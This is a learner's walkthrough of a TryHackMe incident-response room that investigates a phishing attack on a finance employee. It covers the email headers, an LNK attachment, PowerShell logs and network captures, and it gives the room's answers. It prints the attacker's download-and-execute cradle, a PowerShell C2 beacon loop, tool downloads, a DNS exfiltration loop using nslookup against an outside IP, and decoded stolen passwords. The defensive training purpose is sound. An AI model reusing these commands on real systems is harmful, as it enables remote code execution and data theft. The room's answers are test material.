----
A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?
----

### [Introduction] New threat in town.

 Start Machine

﻿_Uncover the secrets of the new emerging threat, the Boogeyman._

In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective. 

![Boogeyman is here!](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b4c110ab477bf9fc0e75bf6094bb1c5a.png)  

Prerequisites

This room may require the combined knowledge gained from the SOC L1 Pathway. We recommend going through the following rooms before attempting this challenge.

-   [Phishing Analysis Fundamentals](https://tryhackme.com/room/phishingemails1tryoe)
-   [Phishing Analysis Tools](https://tryhackme.com/room/phishingemails3tryoe)
-   [Windows Event Logs](https://tryhackme.com/room/windowseventlogs)
-   [Wireshark: Traffic Analysis](https://tryhackme.com/room/wiresharktrafficanalysis)
-   Tshark (coming soon!)

Investigation Platform

Before we proceed, deploy the attached machine by clicking the **Start Machine button** in the upper-right-hand corner of the task. It may take up to 3-5 minutes to initialise the services.

The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.  

Artefacts  

For the investigation proper, you will be provided with the following artefacts:

-   Copy of the phishing email (dump.eml)
-   Powershell Logs from Julianne's workstation (powershell.json)
-   Packet capture from the same workstation (capture.pcapng)

Note: The powershell.json file contains JSON-formatted PowerShell logs extracted from its original evtx file via the [evtx2json](https://github.com/Silv3rHorn/evtx2json) tool.

You may find these files in the /home/ubuntu/Desktop/artefacts directory.  

Tools

﻿The provided VM contains the following tools at your disposal:

-   Thunderbird - a free and open-source cross-platform email client.
-   [LNKParse3](https://github.com/Matmaus/LnkParse3) - a python package for forensics of a binary file with LNK extension.
-   Wireshark - GUI-based packet analyser.
-   Tshark - CLI-based Wireshark. 
-   jq - a lightweight and flexible command-line JSON processor.

To effectively parse and analyse the provided artefacts, you may also utilise built-in command-line tools such as:

-   grep
-   sed
-   awk
-   base64

Now, let's start hunting the Boogeyman!

Answer the questions below

Let's hunt that boogeyman!

 Completed

### [Email Analysis] Look at that headers!

The Boogeyman is here!  

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

![Email Sample.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/28bbc4ff07b8ad16da155894ca3d2d73.png)  

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

Investigation Guide

Given the initial information, we know that the compromise started with a phishing email. Let's start with analysing the **dump.eml** file located in the artefacts directory. There are two ways to analyse the headers and rebuild the attachment:

-   The manual way uses command-line tools such as **cat**, **grep**, **base64**, and **sed.** Analyse the contents manually and build the attachment by decoding the string located at the bottom of the file.

ubuntu@tryhackme:~

```shell-session
ubuntu@tryhackme$ echo # sample command to rebuild the payload, presuming the encoded payload is written in another file, without all line terminators
ubuntu@tryhackme$ cat *PAYLOAD FILE* | base64 -d > Invoice.zip
```

-   An alternative and easier way to do this is to double-click the EML file to open it via Thunderbird. The attachment can be saved and extracted accordingly.

Once the payload from the encrypted archive is extracted, use **lnkparse** to extract the information inside the payload.

ubuntu@tryhackme:~

```shell-session
ubuntu@tryhackme$ lnkparse *LNK FILE*
```

Answer the questions below

```
doing in 2 ways
ubuntu@tryhackme:~/Desktop/artefacts$ echo "UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6/jU+4
> ClhWAZwY+LBcOUvw6oMIq5WNiZwjlKXvAj+pMMBFROiABqlJBxngGOoWUKX0yBXsXOhYPq3Z+Zls
> vZX0xZqtZ/KWnX/QpZXzW44KZz1eqH+hnLgKXPTBsyTSqpqK9QUvYEsltPMSYnL0IqSNwX2TuL9l
> oB0QB3owNKK2cltANxR5Nt3pdYwKJ4BqqI4x7D/ze4bWBT1jlR4HW8VEByEyLoc2fw3I0r0bc/8J
> v9g1SZPBvshBg0pxI0/89GR2agMP+Lv6smkO/huUEOSRpidp/ft+prkt5v9sHFyS/Q0CTb9njCi2
> terQ9NTeFAOkNAhGxWUPqPwPzB0cS+GBC2JY3LMqlA0K5aTejRodyVPcLlq2KVbyF7XljH2NZA4T
> bFsDNJMFk2fQB1hfvmseP9FA20VAfwYvYW8GnBDdqhJtAwJ5xNvJgFFK/MTY2fChwTNN2zszqhzn
> v1Sx+71+duA41HGR9K/jh4nEeRgPslOVlGtLwKBikbIpx/5ZaLpiZYwKS177jDoh3Qx+FRxsM6Ue
> hjPSNgKmWHFZjReDWx8KD7qGLL9acO0hvZUuH83b70sAREDJbw+4sC2jcYO+hrHys6E4Dml030WQ
> WhkKpvYv4DUw9nDmkGg4YgnyAv/iMbtImSUZQ/Wc6dEJM213hYefp8DTQZ321fZU5iCk86bAdxX2
> 3Ov40S9eX78X7CSp9b0QKNeC+N3JgMJ/gQrCWC73UfmHjT4mkBoP8A4YktR2LFNeistVP/zeMQPS
> qUs8KaI7q+VTu/9buNeWkEW2maDm+bC0Q4AnJL+AocgZDPJ0RzfLWEpff3nbaYb6aPqhLTBfFURi
> dszLIMEKmDLmiVqkWZJly9qV26NFttz5y4Q+fAATd6tMYRDlu/BFCo4+rdxjiKl0Gnn7UBHCq0gy
> eEv/L8bppKI09XqNV3MJxMLBE3RN7E080hVp07qDpNpQTYEFa08gGy6yYFBLAQI/ABQAAQAIAGiG
> LVZRFQDJ3gIAACgJAAAUACQAAAAAAAAAIAAAAAAAAABJbnZvaWNlXzIwMjMwMTAzLmxuawoAIAAA
> AAAAAQAYAGiPRUBvJ9kBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAGYAAAAQAwAAAAA=" | base64 -d > Invoice2.zip
ubuntu@tryhackme:~/Desktop/artefacts$ ls
Invoice.zip   capture.pcapng  evtx2json        powershell.json
Invoice2.zip  dump.eml        powershell.evtx
ubuntu@tryhackme:~/Desktop/artefacts$ file Invoice2.zip 
Invoice2.zip: Zip archive data, at least v2.0 to extract
ubuntu@tryhackme:~/Desktop/artefacts$ file Invoice.zip 
Invoice.zip: Zip archive data, at least v2.0 to extract

source email

From: Arthur Griffin <agriffin@bpakcaging.xyz>
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Message-Id: <4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>
Reply-To: Arthur Griffin <agriffin@bpakcaging.xyz>
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott <julianne.westcott@hotmail.com>

DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
	c=relaxed/simple; t=1673601926;
	h=from:date:subject:reply-to:to:list-unsubscribe;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=jcC3z+U5lVQUJEYRyQ76Z+xaJMrXN2YdjyM8pUl7hgXesQaY7rqSORNRWynpDQ3/CBSllw31eDq
	WmoqpFqj2uVy5RXK73lkBEHs5ju1eH/4svHpZLS9+wU/tO5dfZVUImvY32iinpJCtoiMLjdpKYMA/
	d5BBGqluALtqy9fZQzM=
List-Unsubscribe:
 =?us-ascii?q?=3Cmailto=3Aunsubscribe+HPk2p-JE=5FjYbkWIRB-SmuA2=40bounces=2Eelasticem?=
 =?us-ascii?q?ail=2Enet=3Fsubject=3Dunsubscribe=3E=2C?=
 =?us-ascii?q?_=3Chttp=3A=2F=2Ftracking=2Ebpakcaging=2Exyz=2Ftracking=2Funsubscribe=3Fmsgid=3DHP?=
 =?us-ascii?q?k2p-JE=5FjYbkWIRB-SmuA2&c=3D0=3E?=

Hi Julianne,

I hope you are well.

I just wanted to drop you a quick note to remind you in respect of doc=
ument #39586972 is due for payment on January 20, 2023.

I would be grateful if you could confirm everything is on track for pa=
yment.

For additional information, kindly see the attached document.

You may use this code to view the encrypted file: Invoice2023!


Best regards,
Arthur Griffin
Collections Officer
B Packaging Inc.

ubuntu@tryhackme:~/Desktop/artefacts$ unzip Invoice.zip 
Archive:  Invoice.zip
[Invoice.zip] Invoice_20230103.lnk password: 
  inflating: Invoice_20230103.lnk 

ubuntu@tryhackme:~/Desktop/artefacts$ lnkparse Invoice_20230103.lnk 
Windows Shortcut Information:
   Link CLSID: 00021401-0000-0000-C000-000000000046
   Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16637)
   File Flags:  - (0)

   Creation Timestamp: None
   Modified Timestamp: None
   Accessed Timestamp: None

   Icon Index: 0 
   Window Style: SW_SHOWMINNOACTIVE 
   HotKey: CONTROL - C {0x4302} 

   TARGETS:
      Index: 78
      ITEMS:
         Root Folder
            Sort index: My Computer
            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
         Volume Item
            Flags: 0xf
            Data: None
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: Windows
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: System32
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: WindowsPowerShell
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: v1.0
         File entry
            Flags: Is file
            Modification time: None
            File attribute flags: 0
            Primary name: powershell.exe

   DATA
      Description: Invoice Jan 2023
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:
      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
      Icon location: C:\Users\Administrator\Desktop\excel.ico

   EXTRA BLOCKS:
      ICON_LOCATION_BLOCK
         Target ansi: %USERPROFILE%\Desktop\excel.ico
         Target unicode: %USERPROFILE%\Desktop\excel.ico
      SPECIAL_FOLDER_LOCATION_BLOCK
         Special folder id: 37
      KNOWN_FOLDER_LOCATION_BLOCK
         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
      METADATA_PROPERTIES_BLOCK
         Version: 0x53505331
         Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE

iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')


```

![[Pasted image 20230415090125.png]]
![[Pasted image 20230415090305.png]]
![[Pasted image 20230415090406.png]]


What is the email address used to send the phishing email?

	*agriffin@bpakcaging.xyz*

What is the email address of the victim?

	*julianne.westcott@hotmail.com*

What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?  

*elasticemail*

What is the name of the file inside the encrypted attachment?  

*Invoice_20230103.lnk*

What is the password of the encrypted attachment?  

*Invoice2023!*

Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?  

	*aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==*

### [Endpoint Security] Are you sure that’s an invoice?

Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:

-   A PowerShell command was executed.
-   Decoding the payload reveals the starting point of endpoint activities. 

Investigation Guide  

With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:

-   Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
-   Since the given data is JSON, we can parse it in CLI using the `jq` command.
-   Note that some logs are redundant and do not contain any critical information; hence can be ignored.

JQ Cheatsheet

﻿**jq** is a lightweight and flexible command-line JSON processor**.** This tool can be used in conjunction with other text-processing commands. 

You may use the following table as a guide in parsing the logs in this task.

Note: You must be familiar with the existing fields in a single log.

Parse all JSON into beautified output

`cat powershell.json | jq`   

Print all values from a specific field without printing the field

`cat powershell.json | jq '.Field1'`  

Print all values from a specific field  

`cat powershell.json | jq '{Field1}'`  

Print values from multiple fields

`cat powershell.json | jq '{Field1, Field2}'`  

Sort logs based on their Timestamp

`cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'`  

Sort logs based on their Timestamp and print multiple field values  

`cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {Field}'`  

You may continue learning this tool via its [documentation](https://stedolan.github.io/jq/manual/).  

Answer the questions below

```
ubuntu@tryhackme:~/Desktop/artefacts$ file powershell.json 
powershell.json: JSON data

ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {"ScriptBlockText"}'


{"ScriptBlockText":"iex (new-object net.webclient).downloadstring('


')"}
{"ScriptBlockText":"$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n"}
{"ScriptBlockText":"echo `r;pwd"}
{"ScriptBlockText":"whoami;pwd"}
{"ScriptBlockText":"cd C:\\;pwd"}
{"ScriptBlockText":"ls;pwd"}
{"ScriptBlockText":"cd Users;pwd"}
{"ScriptBlockText":"cd j.westcott;pwd"}
{"ScriptBlockText":"ps;pwd"}
{"ScriptBlockText":"iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"}
{"ScriptBlockText":"cd Public;pwd"}
{"ScriptBlockText":"cd Music;pwd"}
{"ScriptBlockText":"iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd"}
{"ScriptBlockText":".\\sb.exe all;pwd"}
{"ScriptBlockText":".\\sb.exe system;pwd"}
{"ScriptBlockText":".\\sb.exe;pwd"}
{"ScriptBlockText":".\\sb.exe -group=all;pwd"}
{"ScriptBlockText":"Seatbelt.exe -group=user;pwd"}
{"ScriptBlockText":".\\sb.exe -group=user;pwd"}
{"ScriptBlockText":"ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd"}
{"ScriptBlockText":"cd ..\\AppData;pwd"}
{"ScriptBlockText":"ls Local;pwd"}
{"ScriptBlockText":"ls Local\\Packages;pwd"}
{"ScriptBlockText":"cd ..;pwd"}
{"ScriptBlockText":"ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd"}
{"ScriptBlockText":"ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState;pwd"}
{"ScriptBlockText":"iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd"}
{"ScriptBlockText":".\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd"}
{"ScriptBlockText":".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd"}
{"ScriptBlockText":"cd Documents;pwd"}
{"ScriptBlockText":"$file='protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"}
{"ScriptBlockText":"split-path $pwd'\\0x00';pwd"}
{"ScriptBlockText":"$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"}
{"ScriptBlockText":"$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd"}
{"ScriptBlockText":"$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";;pwd"}

Estos son comandos en lenguaje PowerShell que se utilizan para descargar un archivo de un servidor remoto, ejecutarlo en una ubicación específica, acceder a una base de datos protegida y realizar una búsqueda de direcciones IP en un dominio específico.

En resumen, el script descarga un archivo llamado "sq3.exe" desde un servidor remoto, lo guarda en una carpeta local, y lo utiliza para acceder a una base de datos "plum.sqlite" ubicada en "AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState". También busca la dirección IP de varios dominios en "bpakcaging.xyz" y envía los resultados a una dirección IP de destino "167.71.211.113". El comando "pwd" se utiliza para mostrar el directorio actual en el que se encuentra el usuario.

El comando que se utiliza para enviar los resultados de la búsqueda de direcciones IP a la dirección IP de destino "167.71.211.113" es el comando "nslookup" seguido de la opción "-q=A" y la dirección URL del dominio que se está buscando. El resultado de la búsqueda se envía a través del protocolo DNS a la dirección IP de destino especificada.
```

What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

*cdn.bpakcaging.xyz,files.bpakcaging.xyz*

What is the name of the enumeration tool downloaded by the attacker?  

The attacker mistakenly executed the exact tool name.

*Seatbelt*

What is the file accessed by the attacker using the downloaded **sq3.exe** binary? Provide the full file path with escaped backslashes.

Trace back the executed cd commands.

	*C:\\Users\\j.westcott\\Music\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite*

What is the software that uses the file in Q3?

*Microsoft Sticky Notes*

What is the name of the exfiltrated file?  

*protected_data.kdbx*

What type of file uses the .kdbx file extension?

*KeePass*

What is the encoding used during the exfiltration attempt of the sensitive file?  

*hex*

What is the tool used for exfiltration?

*nslookup*

### [Network Traffic Analysis] They got us. Call the bank immediately!

Based on the PowerShell logs investigation, we have seen the full impact of the attack:

-   The threat actor was able to read and exfiltrate two potentially sensitive files.
-   The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.

Investigation Guide  

Finally, we can complete the investigation by understanding the network traffic caused by the attack:

-   Utilise the domains and ports discovered from the previous task.
-   All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
-   Follow the streams of the notable commands discovered from PowerShell logs.
-   Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.

Answer the questions below

```
using wirehark

filter http.request.method == "POST"

POST /27fe2489 HTTP/1.1
X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Content-Type: application/x-www-form-urlencoded
Host: cdn.bpakcaging.xyz:8080
Content-Length: 229
Connection: Keep-Alive

13 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 87 105 110 100 111 119 115 92 115 121 115 116 101 109 51 50 13 10 13 10 13 10HTTP/1.0 200 OK
Server: Apache/2.4.1 
Date: Fri, 13 Jan 2023 17:10:11 GMT
Access-Control-Allow-Origin: *
Content-Type: text/plain

OK

Host: cdn.bpakcaging.xyz:8080 using python default port :)

or stream 327

GET /sb.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Host: files.bpakcaging.xyz
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.7
Date: Fri, 13 Jan 2023 17:14:33 GMT
Content-type: application/x-msdos-program
Content-Length: 596992
Last-Modified: Fri, 13 Jan 2023 17:13:29 GMT

stream 750

POST /27fe2489 HTTP/1.1
X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Content-Type: application/x-www-form-urlencoded
Host: cdn.bpakcaging.xyz:8080
Content-Length: 1522
Connection: Keep-Alive

92 105 100 61 56 54 56 49 53 48 98 100 45 97 53 54 52 45 52 50 51 98 45 57 50 53 54 45 55 48 100 51 55 56 49 55 57 52 98 49 32 77 97 115 116 101 114 32 80 97 115 115 119 111 114 100 13 10 92 105 100 61 97 100 56 98 53 50 102 48 45 101 49 98 98 45 52 48 102 54 45 98 98 102 57 45 52 55 97 53 51 102 57 49 56 48 97 98 32 37 112 57 94 51 33 108 76 94 77 122 52 55 69 50 71 97 84 94 121 124 77 97 110 97 103 101 100 80 111 115 105 116 105 111 110 61 68 101 118 105 99 101 73 100 58 92 92 63 92 68 73 83 80 76 65 89 35 68 101 102 97 117 108 116 95 77 111 110 105 116 111 114 35 49 38 51 49 99 53 101 99 100 52 38 48 38 85 73 68 50 53 54 35 123 101 54 102 48 55 98 53 102 45 101 101 57 55 45 52 97 57 48 45 98 48 55 54 45 51 51 102 53 55 98 102 52 101 97 97 55 125 59 80 111 115 105 116 105 111 110 61 49 49 48 54 44 52 51 59 83 105 122 101 61 51 50 48 44 51 50 48 124 49 124 48 124 124 89 101 108 108 111 119 124 48 124 124 124 124 124 124 48 124 124 56 99 97 50 50 99 48 101 45 98 97 53 101 45 52 57 57 97 45 97 56 54 99 45 55 52 55 51 97 53 51 100 99 54 100 101 124 55 52 102 48 56 55 50 52 45 99 99 99 57 45 52 99 101 54 45 57 52 101 55 45 56 99 57 57 101 54 99 100 52 50 99 54 124 54 51 56 48 57 50 50 52 55 51 57 55 49 57 57 53 56 57 124 124 54 51 56 48 57 50 50 52 55 53 49 54 49 48 55 48 55 57 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 85 115 101 114 115 92 106 46 119 101 115 116 99 111 116 116 13 10 13 10 13 10HTTP/1.0 200 OK
Server: Apache/2.4.1 
Date: Fri, 13 Jan 2023 17:25:38 GMT
Access-Control-Allow-Origin: *
Content-Type: text/plain

OK

from decimal using cyberchef

id=868150bd-a564-423b-9256-70d3781794b1 Master Password
	\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab       %p9^3!lL^Mz47E2GaT^y
|ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#1&31c5ecd4&0&UID256#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=1106,43;Size=320,320|1|0||Yellow|0||||||0||8ca22c0e-ba5e-499a-a86c-7473a53dc6de|74f08724-ccc9-4ce6-94e7-8c99e6cd42c6|638092247397199589||638092247516107079

Path               
----               
C:\Users\j.westcott

last stream 1074

POST /27fe2489 HTTP/1.1
X-38d2-8f49: 8cce49b0-b86459bb-27fe2489
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.18362.145
Content-Type: application/x-www-form-urlencoded
Host: cdn.bpakcaging.xyz:8080
Content-Length: 78618
Connection: Keep-Alive

42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 51 68 57 65 50 57 65 54 55 70 66 52 66 66 53 48 49 48 48 48 51 48 48 48 50 49 48 48 48 51 49 67 49 70 50 69 54 66 70 55 49 52 51 53 48 66 69 53 56 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 53 50 49 54 65 70 67 53 65 70 70 48 51 48 52 48 48 48 49 48 48 48 48 48 48 48 52 50 48 48 48 65 70 52 68 69 55 65 52 54 55 70 65 68 70 66 70 69 66 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 69 66 55 56 65 69 49 57 52 66 48 51 57 50 54 51 51 51 69 48 67 67 57 54 56 55 50 55 65 49 70 70 56 67 67 52 67 68 53 49 53 49 70 65 65 67 48 53 50 48 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 48 53 49 54 51 51 52 67 56 49 70 57 53 65 56 55 49 65 69 54 70 53 67 54 66 66 57 55 48 55 53 66 55 52 67 54 48 49 54 65 68 65 68 52 67 51 53 66 51 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 65 51 50 55 66 70 70 52 56 66 56 51 55 66 52 56 48 54 48 56 48 48 54 48 69 65 48 48 48 48 48 48 48 48 48 48 48 48 48 55 49 48 48 48 48 70 50 50 70 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 51 56 57 52 51 70 56 69 68 52 56 53 67 57 50 68 65 56 52 66 67 67 69 50 69 50 48 56 50 48 48 48 67 52 55 49 53 55 66 65 70 48 69 54 65 55 69 70 51 53 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 65 48 48 55 51 49 66 54 67 69 54 49 57 50 56 49 51 70 55 65 67 57 53 49 70 48 67 54 52 54 48 68 56 57 65 50 55 68 57 49 68 69 49 53 67 53 48 57 50 48 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 48 48 55 49 56 55 66 56 52 68 68 52 69 49 50 49 65 69 68 51 54 54 56 70 55 53 70 51 55 54 49 69 56 65 65 67 51 49 54 57 70 56 49 48 50 53 65 53 65 69 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 32 13 10 32 42 42 42 32 85 110 75 110 111 119 110 32 99 97 110 39 116 32 102 105 110 100 32 46 98 112 97 107 99 97 103 105 110 103 46 120 121 122 58 32 85 110 115 112 101 99 105 102 105 101 100 32 101 114 114 111 114 32 13 10 32 42 42 42 32 78 111 32 97 100 100 114 101 115 115 32 40 65 41 32 114 101 99 111 114 100 115 32 97 118 97 105 108 97 98 108 101 32 102 111 114 32 51 48 68 54 53 55 52 52 56 70 52 52 48 49 56 57 